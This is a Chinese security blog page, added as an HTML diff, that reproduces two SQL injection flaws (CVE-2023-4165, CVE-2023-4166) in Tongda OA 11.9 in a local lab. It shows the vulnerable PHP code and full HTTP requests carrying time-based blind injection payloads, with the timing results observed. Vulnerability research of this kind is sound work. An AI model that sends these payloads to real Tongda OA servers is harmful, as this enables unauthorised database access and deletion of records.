@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="通达OA俩SQL注入复现与分析前言又是各种day的poc满天飞，我今天挑个通达OA的POC来验证一下其真实性，在此写下文章来分析记录一下。 声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 环境搭建下载地址：https:&#x2F;&#x2F;cdndown.tongda2000.com&#x2F;oa&#x2F;2019&#x2F;TDOA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通达OA俩SQL注入复现与分析">
+<meta property="og:url" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="通达OA俩SQL注入复现与分析前言又是各种day的poc满天飞，我今天挑个通达OA的POC来验证一下其真实性，在此写下文章来分析记录一下。 声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。 环境搭建下载地址：https:&#x2F;&#x2F;cdndown.tongda2000.com&#x2F;oa&#x2F;2019&#x2F;TDOA">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/np0cqC-ZtoHBUc6CPnTPQx8DSxiwOs2LbZJ1MnIVFGI.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/S2CIMEicu1MBIEk5F0vg-cmOaY5WIX4dGAB6NKDPi88.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/SLJtnd44OVe1lg3IEE0GC-Vg0VQ9_ucdifOtfUGdy2o.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/OoNX36HRXFQkPXYGpajEy3ZHZ9Aih80lkDxO5JYJh0w.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/JZYWNCzXgYQJDJA92G4Ec0Ag1wnZ-RROzVRJFdunDTM.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/cW-kUaH8mS05UcG2WaAP_rWUtqwh8SQTPn0O7oA0kdE.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/eT_CApFo1dwMcLHzJFgstefYbFBMyYrm0usYFLoE8Ts.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/dQTJwnV2uhNTduIWpz6DzDth_Yi2OqcDIbhK_JNqzhw.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/awo04MA-NNvHeC1fXz6GTTDGuYNf5XDy4MQs67aWXtY.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/FROEpmeUuGVjdXie9FgZRBuaLJLmaPUvnYahEFri6bI.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/2Wd53_RizcrBnBxKoVs29xK6a9VRNUvml02o-3sIT3o.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/pJfAP9s9Vp86zdzjoOdBH_88BZA092aWVB0ErazT_B8.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/I0nY_rrTd4NON_Gv7-oVViSEbxxABU0blZ75pzc2LMQ.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Jbc-OY30ZVSdJkz_pX7kMYS8j-5QzMkquAgBRJeipTs.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/bSC8Ul2fUuNzPwgdgeHbyLEXFJlo6SzOp9GVx7WIDHc.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/r-HFac3C3wr14eUFJ6UDgqOC0LABfPq4peEBnxZd728.png">
+<meta property="og:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Vk5VTUjI-fRXAIxf5rBC1eJfae3lKJYBdlbuUYTHsVo.png">
+<meta property="article:published_time" content="2023-08-10T09:59:49.000Z">
+<meta property="article:modified_time" content="2023-08-10T10:27:34.270Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/np0cqC-ZtoHBUc6CPnTPQx8DSxiwOs2LbZJ1MnIVFGI.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>通达OA俩SQL注入复现与分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/08/09/WPS%20Office%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&text=通达OA俩SQL注入复现与分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title=通达OA俩SQL注入复现与分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&is_video=false&description=通达OA俩SQL注入复现与分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=通达OA俩SQL注入复现与分析&body=Check out this article: https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title=通达OA俩SQL注入复现与分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title=通达OA俩SQL注入复现与分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title=通达OA俩SQL注入复现与分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&title=通达OA俩SQL注入复现与分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&name=通达OA俩SQL注入复现与分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/&t=通达OA俩SQL注入复现与分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">通达OA俩SQL注入复现与分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2023-4165%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析（CVE-2023-4165）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2023-4166%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析（CVE-2023-4166）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99"><span class="toc-number">1.5.</span> <span class="toc-text">工具编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        通达OA俩SQL注入复现与分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-08-10T09:59:49.000Z" class="dt-published" itemprop="datePublished">2023-08-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>, <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="通达OA俩SQL注入复现与分析"><a href="#通达OA俩SQL注入复现与分析" class="headerlink" title="通达OA俩SQL注入复现与分析"></a>通达OA俩SQL注入复现与分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是各种day的poc满天飞，我今天挑个通达OA的POC来验证一下其真实性，在此写下文章来分析记录一下。</p>
+<p><em>声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</em></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe">https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe</a></p>
+<p><img src="np0cqC-ZtoHBUc6CPnTPQx8DSxiwOs2LbZJ1MnIVFGI.png" alt="image"></p>
+<p>服务启动</p>
+<p><img src="S2CIMEicu1MBIEk5F0vg-cmOaY5WIX4dGAB6NKDPi88.png" alt="image"></p>
+<p>利用admin账号成功登录，密码默认为空</p>
+<p><img src="SLJtnd44OVe1lg3IEE0GC-Vg0VQ9_ucdifOtfUGdy2o.png" alt="image"></p>
+<h2 id="漏洞分析（CVE-2023-4165）"><a href="#漏洞分析（CVE-2023-4165）" class="headerlink" title="漏洞分析（CVE-2023-4165）"></a>漏洞分析（<strong>CVE-2023-4165</strong>）</h2><p>根据网传的poc，直接来看&#x2F;general&#x2F;system&#x2F;seal_manage&#x2F;iweboffice&#x2F;delete_seal.php文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once <span class="string">&quot;inc/auth.inc.php&quot;</span>;</span><br><span class="line">include_once <span class="string">&quot;inc/header.inc.php&quot;</span>;</span><br><span class="line">include_once <span class="string">&quot;inc/utility_all.php&quot;</span>;</span><br><span class="line">$CUR_TIME = date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, time());</span><br><span class="line">$DELETE_STR = rtrim($DELETE_STR, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">$query = <span class="string">&quot;delete from office_seal WHERE ID IN ($DELETE_STR)&quot;</span>;</span><br><span class="line">exequery(TD::conn(), $query);</span><br><span class="line">header(<span class="string">&quot;location:manage.php?start=$start&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>实现的功能是从数据库中删除指定的记录。前面三句是包含其它文件进来。然后第四句开始是创建了一个名为 $CUR_TIME 的变量，保存当前时间。当前时间可能是为了记录删除操作的时间戳。对 $DELETE_STR 变量进行处理，使用rtrim()  函数去掉末尾的逗号（,）。然后是构造了一个 SQL 查询语句，使用 $DELETE_STR 中的值作为 ID 列的筛选条件。</p>
+<p><img src="OoNX36HRXFQkPXYGpajEy3ZHZ9Aih80lkDxO5JYJh0w.png" alt="image"></p>
+<p>调用 exequery() 函数执行 SQL 查询；使用 header() 函数将请求重定向到另一个页面。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exequery(TD::conn(), $query);</span><br><span class="line">header(<span class="string">&quot;location:manage.php?start=$start&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>分析到这里的时候，很明显的一个SQL语句拼接，确认存在SQL注入。</p>
+<p>但是我们看到前面是把inc&#x2F;auth.inc.php包含进来了的，也就是说需要有登录后的权限才能执行下面的删除操作。</p>
+<p><img src="JZYWNCzXgYQJDJA92G4Ec0Ag1wnZ-RROzVRJFdunDTM.png" alt="image"></p>
+<p>没登录的时候，直接访问则会显示“用户未登录，请重新登录!”</p>
+<p><img src="cW-kUaH8mS05UcG2WaAP_rWUtqwh8SQTPn0O7oA0kdE.png" alt="image"></p>
+<p>我们登录之后进行测试。发现是印章日志查询的功能。</p>
+<p><img src="eT_CApFo1dwMcLHzJFgstefYbFBMyYrm0usYFLoE8Ts.png" alt="image"></p>
+<p>尝试进行注入，试一下有没有过滤sleep</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.88.131/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and if(1 =1,sleep(5),1) AND (1) = (1</span></span><br></pre></td></tr></table></figure>
+<p><img src="dQTJwnV2uhNTduIWpz6DzDth_Yi2OqcDIbhK_JNqzhw.png" alt="image"></p>
+<p>分析一下看到在inc&#x2F;conn.php中做了过滤。</p>
+<p>调用链为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inc/auth.inc.php(<span class="number">3</span>)---&gt;inc/session.php(<span class="number">77</span>)---&gt;inc/conn.php---(sql_injection)</span><br></pre></td></tr></table></figure>
+<p>在inc&#x2F;conn.php的sql_injection方法过滤了常见的SQL注入函数</p>
+<p><img src="awo04MA-NNvHeC1fXz6GTTDGuYNf5XDy4MQs67aWXtY.png" alt="image"></p>
+<p>尝试使用网传的poc进行请求</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=<span class="number">1</span>)%20and%<span class="number">20</span>(substr(DATABASE(),<span class="number">1</span>,<span class="number">1</span>))=<span class="type">char</span>(<span class="number">83</span>)%20and%<span class="number">20</span>(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(<span class="number">1</span>)=(<span class="number">1</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.88</span><span class="number">.131</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">116.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp18o8mov6bk99cd338a7e1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br></pre></td></tr></table></figure>
+<p>使用DATABASE获取当前数据库名称，char(84)是ASCII码的T，看到有稍微延迟（推测是SQL语句匹配运行造成的）</p>
+<p><img src="FROEpmeUuGVjdXie9FgZRBuaLJLmaPUvnYahEFri6bI.png" alt="image"></p>
+<p>char(83)未延迟</p>
+<p><img src="2Wd53_RizcrBnBxKoVs29xK6a9VRNUvml02o-3sIT3o.png" alt="image"></p>
+<h2 id="漏洞分析（CVE-2023-4166）"><a href="#漏洞分析（CVE-2023-4166）" class="headerlink" title="漏洞分析（CVE-2023-4166）"></a>漏洞分析（<strong>CVE-2023-4166</strong>）</h2><p>这个漏洞其实和上面的那个差不多，只是漏洞点的位置不同，我们也来简单的看一下吧。</p>
+<p>&#x2F;general&#x2F;system&#x2F;seal_manage&#x2F;dianju&#x2F;delete_log.php</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once <span class="string">&quot;inc/auth.inc.php&quot;</span>;</span><br><span class="line">include_once <span class="string">&quot;inc/header.inc.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (substr($DELETE_STR, -<span class="number">1</span>, <span class="number">1</span>) == <span class="string">&quot;,&quot;</span>) &#123;</span><br><span class="line">	$DELETE_STR = substr($DELETE_STR, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">$query = <span class="string">&quot;delete from SEAL_LOG WHERE LOG_ID IN ($DELETE_STR)&quot;</span>;</span><br><span class="line">exequery(TD::conn(), $query);</span><br><span class="line">header(<span class="string">&quot;location:log.php?start=$start&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>简单分析看了下，大概功能是从”SEAL_LOG”表中删除指定的日志。根据传入的参数$DELETE_STR，该脚本构建了一个DELETE语句，并使用exequery()函数执行该查询。最后还来了割重定向，和上面的那段代码也是非常相似的。也包含了inc&#x2F;auth.inc.php</p>
+<p><img src="pJfAP9s9Vp86zdzjoOdBH_88BZA092aWVB0ErazT_B8.png" alt="image"></p>
+<p>我们就直接上POC了，POC和上面一模一样。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=<span class="number">1</span>)%20and%<span class="number">20</span>(substr(DATABASE(),<span class="number">1</span>,<span class="number">1</span>))=<span class="type">char</span>(<span class="number">84</span>)%20and%<span class="number">20</span>(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(<span class="number">1</span>)=(<span class="number">1</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.88</span><span class="number">.131</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">116.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=4fb6c477; PHPSESSID=brpsncea78tf3qv8jgpdr69d20</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br></pre></td></tr></table></figure>
+<p>延迟两秒多</p>
+<p><img src="I0nY_rrTd4NON_Gv7-oVViSEbxxABU0blZ75pzc2LMQ.png" alt="image"></p>
+<p>延迟一秒左右</p>
+<p><img src="Jbc-OY30ZVSdJkz_pX7kMYS8j-5QzMkquAgBRJeipTs.png" alt="image"></p>
